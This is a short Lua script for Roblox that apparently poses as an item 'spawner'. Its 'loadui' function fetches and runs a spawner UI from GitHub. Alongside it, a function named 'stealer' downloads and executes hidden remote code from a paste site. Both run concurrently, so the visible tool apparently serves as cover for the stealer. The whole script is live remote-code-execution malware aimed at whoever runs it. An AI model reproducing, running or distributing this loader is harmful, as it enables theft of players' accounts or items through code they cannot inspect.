local function stealer()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/opRwCzMCXR5Ud4Ig/raw", true))()
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/thatsepical/visualtest/refs/heads/main/spawner.lua"))()

end

task.spawn(stealer)
task.spawn(loadui)
